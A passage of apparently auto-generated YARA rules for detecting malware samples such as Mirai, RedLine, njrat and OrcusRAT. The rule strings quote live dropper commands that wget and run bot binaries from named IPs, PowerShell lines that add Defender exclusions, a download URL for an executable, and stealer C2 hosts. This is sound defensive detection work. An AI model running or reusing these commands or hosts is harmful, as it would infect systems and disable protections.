      description = "_subset_batch - file Ngioweb(signature)_6128a46a.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "6128a46ac712d7a29512815dc96cdcdde9abde3dc9110d3eebf115b378ad919c"
   strings:
      $s1 = "__vdso_clock_gettime64" fullword ascii /* score: '9.00'*/
      $s2 = "&vPOST /" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      all of them
}

rule Ngioweb_signature__f24209bc {
   meta:
      description = "_subset_batch - file Ngioweb(signature)_f24209bc.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "f24209bc7fef5e6f8b91adb299887aa7d3bc989c46f55af10c39998422c0427d"
   strings:
      $s1 = "Host: /octnt-Let-sm" fullword ascii /* score: '13.00'*/
      $s2 = "POSTHTTP/1.1" fullword ascii /* score: '12.00'*/
      $s3 = "tnam/service/sys/passwd" fullword ascii /* score: '10.00'*/
      $s4 = "__vdso_clock_gettime64" fullword ascii /* score: '9.00'*/
      $s5 = "Content-Tnnec" fullword ascii /* score: '9.00'*/
      $s6 = "aeiobcdfghklmnprstvx" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 400KB and
      all of them
}

rule Mirai_signature__f11e572a {
   meta:
      description = "_subset_batch - file Mirai(signature)_f11e572a.sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "f11e572add7ac8ae3b34d613bf28c8a7991e33269bb7119a17d8186c8c725109"
   strings:
      $s1 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://mclighthouse.ir/hiddenbin/boatnet.arm; curl -O http://mclight" ascii /* score: '25.00'*/
      $s2 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://mclighthouse.ir/hiddenbin/boatnet.arc; curl -O http://mclight" ascii /* score: '25.00'*/
      $s3 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://mclighthouse.ir/hiddenbin/boatnet.ppc; curl -O http://mclight" ascii /* score: '25.00'*/
      $s4 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://mclighthouse.ir/hiddenbin/boatnet.spc; curl -O http://mclight" ascii /* score: '25.00'*/
      $s5 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://mclighthouse.ir/hiddenbin/boatnet.arc; curl -O http://mclight" ascii /* score: '24.00'*/
      $s6 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://mclighthouse.ir/hiddenbin/boatnet.arm; curl -O http://mclight" ascii /* score: '24.00'*/
      $s7 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://mclighthouse.ir/hiddenbin/boatnet.ppc; curl -O http://mclight" ascii /* score: '24.00'*/
      $s8 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://mclighthouse.ir/hiddenbin/boatnet.spc; curl -O http://mclight" ascii /* score: '24.00'*/
      $s9 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://mclighthouse.ir/hiddenbin/boatnet.arm7; curl -O http://mcligh" ascii /* score: '22.00'*/
      $s10 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://mclighthouse.ir/hiddenbin/boatnet.m68k; curl -O http://mcligh" ascii /* score: '22.00'*/
      $s11 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://mclighthouse.ir/hiddenbin/boatnet.i468; curl -O http://mcligh" ascii /* score: '22.00'*/
      $s12 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://mclighthouse.ir/hiddenbin/boatnet.i686; curl -O http://mcligh" ascii /* score: '22.00'*/
      $s13 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://mclighthouse.ir/hiddenbin/boatnet.mips; curl -O http://mcligh" ascii /* score: '22.00'*/
      $s14 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://mclighthouse.ir/hiddenbin/boatnet.x86_64; curl -O http://mcli" ascii /* score: '22.00'*/
      $s15 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://mclighthouse.ir/hiddenbin/boatnet.arm5; curl -O http://mcligh" ascii /* score: '22.00'*/
   condition:
      uint16(0) == 0x630a and filesize < 8KB and
      8 of them
}

rule Mirai_signature__f32d3a95 {
   meta:
      description = "_subset_batch - file Mirai(signature)_f32d3a95.sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "f32d3a95ab45b136af0d5e57a417d0b5b3652abf9d659f7c489cedfa7b015727"
   strings:
      $s1 = "cd /tmp ; rm -rf busybox ; rm -rf mpsl ; wget http://139.177.197.168/mpsl ; cp /bin/busybox /tmp; cp mpsl busybox; chmod 777 bus" ascii /* score: '27.00'*/
      $s2 = "cd /tmp ; rm -rf busybox ; rm -rf mips ; wget http://139.177.197.168/mips ; cp /bin/busybox /tmp; cp mips busybox; chmod 777 bus" ascii /* score: '27.00'*/
      $s3 = "cd /var/tmp ; rm -rf busybox ; rm -rf mips ; wget http://139.177.197.168/mips ; cp /bin/busybox /var/tmp; cp mips busybox; chmod" ascii /* score: '27.00'*/
      $s4 = "cd /tmp ; rm -rf busybox ; rm -rf mips ; wget http://139.177.197.168/mips ; cp /bin/busybox /tmp; cp mips busybox; chmod 777 bus" ascii /* score: '27.00'*/
      $s5 = "cd /tmp ; rm -rf busybox ; rm -rf mpsl ; wget http://139.177.197.168/mpsl ; cp /bin/busybox /tmp; cp mpsl busybox; chmod 777 bus" ascii /* score: '27.00'*/
      $s6 = "cd /var/tmp ; rm -rf busybox ; rm -rf mpsl ; wget http://139.177.197.168/mpsl ; cp /bin/busybox /var/tmp; cp mpsl busybox; chmod" ascii /* score: '27.00'*/
      $s7 = "cd /var/tmp ; rm -rf busybox ; rm -rf mips ; wget http://139.177.197.168/mips ; cp /bin/busybox /var/tmp; cp mips busybox; chmod" ascii /* score: '24.00'*/
      $s8 = "cd /var/tmp ; rm -rf busybox ; rm -rf mpsl ; wget http://139.177.197.168/mpsl ; cp /bin/busybox /var/tmp; cp mpsl busybox; chmod" ascii /* score: '24.00'*/
   condition:
      uint16(0) == 0x6463 and filesize < 1KB and
      all of them
}

rule Mirai_signature__f4f2b1a1 {
   meta:
      description = "_subset_batch - file Mirai(signature)_f4f2b1a1.sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "f4f2b1a1bf7f4b6a034ea35b8639c999e960b567630fb40c04f1771c247b53d5"
   strings:
      $s1 = "wget http://103.149.87.64/mips; chmod 777 mips; ./mips telnet" fullword ascii /* score: '20.00'*/
      $s2 = "wget http://103.149.87.64/arm5; chmod 777 arm5; ./arm5 telnet" fullword ascii /* score: '20.00'*/
      $s3 = "wget http://103.149.87.64/arm4; chmod 777 arm4; ./arm4 telnet" fullword ascii /* score: '20.00'*/
      $s4 = "wget http://103.149.87.64/arm6; chmod 777 arm6; ./arm6 telnet" fullword ascii /* score: '20.00'*/
      $s5 = "wget http://103.149.87.64/mpsl; chmod 777 mpsl; ./mpsl telnet" fullword ascii /* score: '20.00'*/
      $s6 = "wget http://103.149.87.64/arm7; chmod 777 arm7; ./arm7 telnet" fullword ascii /* score: '20.00'*/
      $s7 = "wget http://103.149.87.64/x86_64; chmod 777 x86_64; ./x86_64 telnet" fullword ascii /* score: '20.00'*/
   condition:
      uint16(0) == 0x6777 and filesize < 1KB and
      all of them
}

rule Mirai_signature__f6a6b87e {
   meta:
      description = "_subset_batch - file Mirai(signature)_f6a6b87e.sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "f6a6b87e670412c724c100c239d7a0d0d677438b0ea74618b22d89d939d7f3c1"
   strings:
      $s1 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf x86 ; /bin/busybox wget http://2.58.113.219/x86 ; chmod 777 x86 ; ./x86 li" ascii /* score: '27.00'*/
      $s2 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf ppc ; /bin/busybox wget http://2.58.113.219/ppc ; chmod 777 ppc ; ./ppc li" ascii /* score: '27.00'*/
      $s3 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf x86_64 ; /bin/busybox wget http://2.58.113.219/x86_64 ; chmod 777 x86_64 ;" ascii /* score: '27.00'*/
      $s4 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf mpsl ; /bin/busybox wget http://2.58.113.219/mpsl ; chmod 777 mpsl ; ./mps" ascii /* score: '27.00'*/
      $s5 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf arm6 ; /bin/busybox wget http://2.58.113.219/arm6 ; chmod 777 arm6 ; ./arm" ascii /* score: '27.00'*/
      $s6 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf spc ; /bin/busybox wget http://2.58.113.219/spc ; chmod 777 spc ; ./spc li" ascii /* score: '27.00'*/
      $s7 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf ppc ; /bin/busybox wget http://2.58.113.219/ppc ; chmod 777 ppc ; ./ppc li" ascii /* score: '27.00'*/
      $s8 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf arm4 ; /bin/busybox wget http://2.58.113.219/arm5 ; chmod 777 arm5 ; ./arm" ascii /* score: '27.00'*/
      $s9 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf m68k ; /bin/busybox wget http://2.58.113.219/m68k ; chmod 777 m68k ; ./m68" ascii /* score: '27.00'*/
      $s10 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf arm5 ; /bin/busybox wget http://2.58.113.219/arm4 ; chmod 777 arm4 ; ./arm" ascii /* score: '27.00'*/
      $s11 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf arm7 ; /bin/busybox wget http://2.58.113.219/arm7 ; chmod 777 arm7 ; ./arm" ascii /* score: '27.00'*/
      $s12 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf arm6 ; /bin/busybox wget http://2.58.113.219/arm6 ; chmod 777 arm6 ; ./arm" ascii /* score: '27.00'*/
      $s13 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf spc ; /bin/busybox wget http://2.58.113.219/spc ; chmod 777 spc ; ./spc li" ascii /* score: '27.00'*/
      $s14 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf mpsl ; /bin/busybox wget http://2.58.113.219/mpsl ; chmod 777 mpsl ; ./mps" ascii /* score: '27.00'*/
      $s15 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf arm4 ; /bin/busybox wget http://2.58.113.219/arm5 ; chmod 777 arm5 ; ./arm" ascii /* score: '27.00'*/
   condition:
      uint16(0) == 0x6463 and filesize < 4KB and
      8 of them
}

rule RedLineStealer_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__4d683b88 {
   meta:
      description = "_subset_batch - file RedLineStealer(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_4d683b88.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "4d683b88c061aed2d3b19fd554bfc8480ff5c4394a0bbd6cd437016562b69cc8"
   strings:
      $s1 = "Happy.exe" fullword ascii /* score: '22.00'*/
      $s2 = "DownloadAndExecuteUpdate" fullword ascii /* score: '22.00'*/
      $s3 = "SELECT * FROM Win32_Process Where SessionId='" fullword wide /* score: '22.00'*/
      $s4 = "egram.exe" fullword wide /* score: '22.00'*/
      $s5 = "Implosions.exe" fullword wide /* score: '22.00'*/
      $s6 = "https://ipinfo.io/ip%appdata%\\" fullword wide /* score: '21.00'*/
      $s7 = "get_TaskProcessors" fullword ascii /* score: '20.00'*/
      $s8 = "System.Collections.Generic.IEnumerator<ScannedFile>.get_Current" fullword ascii /* score: '20.00'*/
      $s9 = "System.Collections.Generic.IEnumerable<ScannedFile>.GetEnumerator" fullword ascii /* score: '20.00'*/
      $s10 = "get_encrypted_key" fullword ascii /* score: '17.00'*/
      $s11 = "%appdata%\\discord\\Local Storage\\leveldb" fullword wide /* score: '17.00'*/
      $s12 = "pepesigmarespect.servemp3.com:25920" fullword wide /* score: '17.00'*/
      $s13 = "BCrypt.BCryptGetProperty() (get size) failed with status code:{0}" fullword wide /* score: '15.00'*/
      $s14 = "BCrypt.BCryptGetProperty() failed with status code:{0}" fullword wide /* score: '15.00'*/
      $s15 = "System.Collections.Generic.IEnumerator<ScannedFile>.Current" fullword ascii /* score: '15.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 300KB and
      8 of them
}

rule MystRodX_signature__59568d0e {
   meta:
      description = "_subset_batch - file MystRodX(signature)_59568d0e.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "59568d0e2da98bad46f0e3165bcf8adadbf724d617ccebcfdaeafbb097b81596"
   strings:
      $s1 = "set_thread_area failed when setting up thread-local storage" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 90KB and
      all of them
}

rule RedLineStealer_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__2e3c4107 {
   meta:
      description = "_subset_batch - file RedLineStealer(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_2e3c4107.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "2e3c410728b3564bd615f8e6c64a7fc82fd5385542d02d7134d07bcbbc3f9f09"
   strings:
      $s1 = "zwbz.exe" fullword wide /* score: '22.00'*/
      $s2 = "zwbz.pdb" fullword ascii /* score: '14.00'*/
      $s3 = "GetDigitalRoot" fullword ascii /* score: '12.00'*/
      $s4 = "get_DigitalRoot" fullword ascii /* score: '12.00'*/
      $s5 = "Text Files (*.txt)|*.txt|All Files (*.*)|*.*" fullword wide /* score: '11.00'*/
      $s6 = "Primes_{0}_{1}.txt" fullword wide /* score: '11.00'*/
      $s7 = "Built with .NET Framework 4.0" fullword wide /* score: '10.00'*/
      $s8 = "get_IsAbundant" fullword ascii /* score: '9.00'*/
      $s9 = "get_IsHappy" fullword ascii /* score: '9.00'*/
      $s10 = "get_FactorCount" fullword ascii /* score: '9.00'*/
      $s11 = "get_PrimeFactors" fullword ascii /* score: '9.00'*/
      $s12 = "GetTwinPrimes" fullword ascii /* score: '9.00'*/
      $s13 = "<GetPrimesWithDigitSum>b__0" fullword ascii /* score: '9.00'*/
      $s14 = "GetDigitSum" fullword ascii /* score: '9.00'*/
      $s15 = "get_IsPrime" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      8 of them
}

rule RedLineStealer_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__bcb1cfb3 {
   meta:
      description = "_subset_batch - file RedLineStealer(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_bcb1cfb3.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "bcb1cfb3bca954df8280403d9506872e1e65bb3e248c66d10dece9d3cd6dec71"
   strings:
      $s1 = "fSystem.Drawing.Icon, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3ahSystem.Drawing.Bitmap, S" ascii /* score: '27.00'*/
      $s2 = "ystem.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3aPADPADPBj" fullword ascii /* score: '24.00'*/
      $s3 = "LkWI.exe" fullword wide /* score: '22.00'*/
      $s4 = "Core.Infrastructure.Logging" fullword ascii /* score: '16.00'*/
      $s5 = "GetSuccessScript" fullword ascii /* score: '15.00'*/
      $s6 = "System.Collections.Generic.IEnumerator<TType>.get_Current" fullword ascii /* score: '15.00'*/
      $s7 = "System.Collections.Generic.IEnumerable<TType>.GetEnumerator" fullword ascii /* score: '15.00'*/
      $s8 = "GetWarningScript" fullword ascii /* score: '15.00'*/
      $s9 = "GetInfoScript" fullword ascii /* score: '15.00'*/
      $s10 = "GetFatalScript" fullword ascii /* score: '15.00'*/
      $s11 = "LkWI.pdb" fullword ascii /* score: '14.00'*/
      $s12 = "GetSpecByContentType" fullword ascii /* score: '14.00'*/
      $s13 = "<GetSpecByContentType>b__0" fullword ascii /* score: '14.00'*/
      $s14 = "StructureMap.Configuration.DSL.Expressions" fullword ascii /* score: '13.00'*/
      $s15 = "StructureMap.Pipeline" fullword ascii /* score: '13.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      8 of them
}

rule njrat_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__ffce0038 {
   meta:
      description = "_subset_batch - file njrat(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_ffce0038.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "ffce00382abfc803c5b67e92c275f6f4efeac5592e82c26118f054ab1261d274"
   strings:
      $s1 = "LJMCCIBINFGMDJPPPOB`1[[System.Object, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089]][]" fullword ascii /* score: '27.00'*/
      $s2 = "GNLMOCJGBDCGBMDKABJLMLFNKDHCIPNFPHFN.KDCBGDCBCAPMLPPKAJEJHDAMKOBGHJMHFHOJ+MNFAPLEPDHFEKEPIHAHGEPDPDIIGJFMMEFAP+NHKJBCCGKGABLGENL" ascii /* score: '26.00'*/
      $s3 = "Application.exe" fullword ascii /* score: '18.00'*/
      $s4 = "ELCMFKCNACIAAHDLLDICDHPKBEIPGGLOOCCK" fullword ascii /* score: '11.50'*/
      $s5 = "LEAILIDECGFIOLOGIPKMCIOOOPDGJJPHBGIL" fullword ascii /* score: '11.50'*/
      $s6 = "FKBCOGCCDLINPDEENPAFABEEFDLLGEJJFIPB" fullword ascii /* score: '11.50'*/
      $s7 = "JOLJBFBDLDLBCHLEAALAGOGLJGCHFLOGBLND" fullword ascii /* score: '11.50'*/
      $s8 = "PBLILOGCMILMKIMIGIOJMBEFINMNECEGLGCD" fullword ascii /* score: '11.50'*/
      $s9 = "EPANMOGINMEEDMDOFPLNKIKIBBDLLBFIKAPP" fullword ascii /* score: '11.50'*/
      $s10 = "My.Computer" fullword ascii /* score: '11.00'*/
      $s11 = "DKLDOAAFPAOFKKCEHOAOLPEPCMDDGMNFNLHA" fullword ascii /* score: '9.50'*/
      $s12 = "ELLCEFEDFECJMOLOJNEBJJCMDEAHBBOMBLGB" fullword ascii /* score: '9.50'*/
      $s13 = "KMMBFEEBINIMFPMAFANPDJDADMMCHHANGJHE" fullword ascii /* score: '9.50'*/
      $s14 = "MDAIFMHIMJDJFDNPMHFLFFIOFLFOCJGMOCOM" fullword ascii /* score: '9.50'*/
      $s15 = "ODLCOMPLECKFJJDHINHKGCEMJOCJGCOPPHKE" fullword ascii /* score: '9.50'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 700KB and
      8 of them
}

rule RedLineStealer_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__4107b7ac {
   meta:
      description = "_subset_batch - file RedLineStealer(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_4107b7ac.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "4107b7ac2f19c4a6d314b2ffd4410735c23ea65152fd999461d3dc5c4fb95186"
   strings:
      $s1 = "mjgh.exe" fullword wide /* score: '22.00'*/
      $s2 = "targetColumnName" fullword ascii /* score: '14.00'*/
      $s3 = "set_HasHeaders" fullword ascii /* score: '12.00'*/
      $s4 = "CSV Viewer - " fullword wide /* score: '12.00'*/
      $s5 = ".NET Framework 4.5A" fullword ascii /* score: '10.00'*/
      $s6 = "GetFormattedColumnNames" fullword ascii /* score: '9.00'*/
      $s7 = "csvContent" fullword ascii /* score: '9.00'*/
      $s8 = "GetSelectedRowIndices" fullword ascii /* score: '9.00'*/
      $s9 = "AddColumnDialog" fullword ascii /* score: '9.00'*/
      $s10 = "GetColumnFormat" fullword ascii /* score: '9.00'*/
      $s11 = "GetSelectedRowCount" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      8 of them
}

rule RedLineStealer_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__4df0ed00 {
   meta:
      description = "_subset_batch - file RedLineStealer(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_4df0ed00.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "4df0ed007f7b8dbb52f37facd1bef7638fc216804045167f2af37b32c68a2d71"
   strings:
      $s1 = "SuKJ.exe" fullword wide /* score: '22.00'*/
      $s2 = "targetColumnName" fullword ascii /* score: '14.00'*/
      $s3 = "SuKJ.pdb" fullword ascii /* score: '14.00'*/
      $s4 = "set_HasHeaders" fullword ascii /* score: '12.00'*/
      $s5 = "CSV Viewer - " fullword wide /* score: '12.00'*/
      $s6 = "GetFormattedColumnNames" fullword ascii /* score: '9.00'*/
      $s7 = "csvContent" fullword ascii /* score: '9.00'*/
      $s8 = "GetSelectedRowIndices" fullword ascii /* score: '9.00'*/
      $s9 = "AddColumnDialog" fullword ascii /* score: '9.00'*/
      $s10 = "GetColumnFormat" fullword ascii /* score: '9.00'*/
      $s11 = "GetSelectedRowCount" fullword ascii /* score: '9.00'*/
      $s12 = "XLogT@b" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      8 of them
}

rule njrat_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__7f930050 {
   meta:
      description = "_subset_batch - file njrat(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_7f930050.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "7f930050a1cfb55393b738cef30ccfeeb540bb1d047ffecd0c2aaa038bf69c29"
   strings:
      $x1 = "cmd.exe /c ping 0 -n 2 & del \"" fullword wide /* score: '42.00'*/
      $s2 = "Dllhost.exe" fullword wide /* score: '27.00'*/
      $s3 = "Execute ERROR" fullword wide /* PEStudio Blacklist: strings */ /* score: '26.00'*/
      $s4 = "Stub.exe" fullword ascii /* score: '22.00'*/
      $s5 = "Execute ERROR " fullword wide /* score: '21.00'*/
      $s6 = "/Server.exe" fullword wide /* score: '19.00'*/
      $s7 = "Download ERROR" fullword wide /* PEStudio Blacklist: strings */ /* score: '18.00'*/
      $s8 = "Executed As " fullword wide /* score: '18.00'*/
      $s9 = "winmgmts:\\\\.\\root\\SecurityCenter2" fullword wide /* score: '18.00'*/
      $s10 = "processInformationLength" fullword ascii /* score: '15.00'*/
      $s11 = "getvalue" fullword wide /* score: '13.00'*/
      $s12 = "set cdaudio door closed" fullword wide /* score: '13.00'*/
      $s13 = "shutdown -s -t 00" fullword wide /* score: '12.00'*/
      $s14 = "shutdown -r -t 00" fullword wide /* score: '12.00'*/
      $s15 = "Update ERROR" fullword wide /* PEStudio Blacklist: strings */ /* score: '12.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 100KB and
      1 of ($x*) and 4 of them
}

rule OrcusRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__4e65e1a3 {
   meta:
      description = "_subset_batch - file OrcusRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_4e65e1a3.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "4e65e1a32552f4be1f66f757d52f4544a997ffc41a93eabd7bbeacee5681ba54"
   strings:
      $x1 = "C:\\Users\\Administrator\\Desktop\\Src\\Src\\Plugins\\Runner\\obj\\Debug\\Runner.pdb" fullword ascii /* score: '36.00'*/
      $s2 = "http://198.251.89.176/files/1.exe" fullword wide /* score: '27.00'*/
      $s3 = "Runner.exe" fullword wide /* score: '25.00'*/
      $s4 = "            info.Arguments = \"-Command Add-MpPreference -ExclusionExtension \\\"*.exe\\\" \";" fullword wide /* score: '22.00'*/
      $s5 = "*** Compilation Errors" fullword wide /* score: '20.00'*/
      $s6 = "            ProcessStartInfo info = new ProcessStartInfo(\"powershell.exe\");" fullword wide /* score: '19.00'*/
      $s7 = "            info = new ProcessStartInfo(\"powershell.exe\");" fullword wide /* score: '19.00'*/
      $s8 = "            info.Arguments = \"-Command Add-MpPreference -ExclusionExtension \\\"exe\\\" \";" fullword wide /* score: '15.00'*/
      $s9 = "            info.Arguments = \"-Command Add-MpPreference -ExclusionPath \\\"C:/\\\" \";" fullword wide /* score: '15.00'*/
      $s10 = "            info.WindowStyle = ProcessWindowStyle.Hidden;" fullword wide /* score: '14.00'*/
      $s11 = "                    Console.WriteLine(\"Error Downloading file: \" + ex.Message);" fullword wide /* score: '14.00'*/
      $s12 = "            info.UseShellExecute = true;" fullword wide /* score: '13.00'*/
      $s13 = "            virus.UseShellExecute = true;" fullword wide /* score: '13.00'*/
      $s14 = "            virus.WorkingDirectory = Directory.GetParent(Environment.GetFolderPath(Environment.SpecialFolder.System)).FullName;" fullword wide /* score: '11.00'*/
      $s15 = "Runner.Properties.Resources.resources" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 40KB and
      1 of ($x*) and 4 of them
}

rule PureLogsStealer_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__02fcd45c {
   meta:
      description = "_subset_batch - file PureLogsStealer(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_02fcd45c.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "02fcd45c1ccd124ef1af257362389346c99e7c2bcdf39293d13a17a54c9f6a5a"
   strings:
      $x1 = "fSystem.Drawing.Icon, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3ajSystem.CodeDom.MemberAtt" ascii /* score: '32.00'*/
      $x2 = "fSystem.Drawing.Icon, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3ajSystem.CodeDom.MemberAtt" ascii /* score: '32.00'*/
      $s3 = "ributes, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089mSystem.Globalization.CultureInfo, mscorlib, V" ascii /* score: '24.00'*/
      $s4 = "JBBCFOAFMMFDEGMAFLF`1[[System.Object, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089]][]" fullword ascii /* score: '24.00'*/
      $s5 = "ersion=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089fSystem.Drawing.Size, System.Drawing, Version=4.0.0.0, Culture=n" ascii /* score: '24.00'*/
      $s6 = "KNHHNLNOOELCGFCNCCMPMBCOLDKIHNPNAOOD.IFKKJGNJCGCNMOJFKCAECIPKLLDBNOMODJLN+BCIADEMBODCKNMOCJPEOMDNLJNMAEIMCFEIB+KGLDDCHIPLMHHCILG" ascii /* score: '23.00'*/
      $s7 = "Steal1.exe" fullword wide /* score: '22.00'*/
      $s8 = "<GetBadProcesses>d__1" fullword ascii /* score: '20.00'*/
      $s9 = "_IEJAEJKFGOACAMHDNODBLDHPKADLKKOHCDHE.HJGIJAGDMPIDNNFHFFMEBHNDBEHDHALGBINJ+<GetBadProcesses>d__1" fullword ascii /* score: '19.00'*/
      $s10 = "<badprocesses>5__2" fullword ascii /* score: '15.00'*/
      $s11 = "Process " fullword wide /* score: '15.00'*/
      $s12 = "System.Globalization.TextInfo%System.Globalization.NumberFormatInfo'System.Globalization.DateTimeFormatInfo&System.Globalization" ascii /* score: '14.00'*/
      $s13 = " System.Globalization.CompareInfo" fullword ascii /* score: '14.00'*/
      $s14 = "eutral, PublicKeyToken=b03f5f7f11d50a3a" fullword ascii /* score: '13.00'*/
      $s15 = "KHCBMIDLOGIKMIGDHJNDMNEKKCPOFOEDIFEG" fullword ascii /* score: '11.50'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      1 of ($x*) and 4 of them
}

rule QuasarRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__161b4cad {
   meta:
      description = "_subset_batch - file QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_161b4cad.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "161b4cad6fe77751ce98a31d3ff0a3b0529580e465321a737740bcdd62bafec6"
   strings:
      $s1 = "Client.exe" fullword ascii /* score: '22.00'*/
      $s2 = "CloseMutex" fullword ascii /* score: '15.00'*/
      $s3 = "loggerLo" fullword ascii /* score: '14.00'*/
      $s4 = "stem.Run" fullword ascii /* score: '13.00'*/
      $s5 = "    <asmv3:windowsSettings xmlns=\"http://schemas.microsoft.com/SMI/2005/WindowsSettings\">" fullword ascii /* score: '12.00'*/
      $s6 = "xClient.Core.Data" fullword ascii /* score: '11.00'*/
      $s7 = "remoteport" fullword ascii /* score: '11.00'*/
      $s8 = "time.Rem" fullword ascii /* score: '10.00'*/
      $s9 = "e.dlll" fullword ascii /* score: '10.00'*/
      $s10 = "logg<er" fullword ascii /* score: '9.00'*/
      $s11 = "xIrcBqEN7n4yyohj7Hq" fullword ascii /* score: '9.00'*/
      $s12 = "* 8 O ] p " fullword ascii /* score: '9.00'*/
      $s13 = "pnYCwRFbTYx3BCSPyxW" fullword ascii /* score: '9.00'*/
      $s14 = "<GetSubtypes>d__2" fullword ascii /* score: '9.00'*/
      $s15 = "iRcP_.-" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 1000KB and
      8 of them
}

rule PureLogsStealer_signature__2 {
   meta:
      description = "_subset_batch - file PureLogsStealer(signature).exe"
      author = "Metin Yigit"
      reference = "internal"
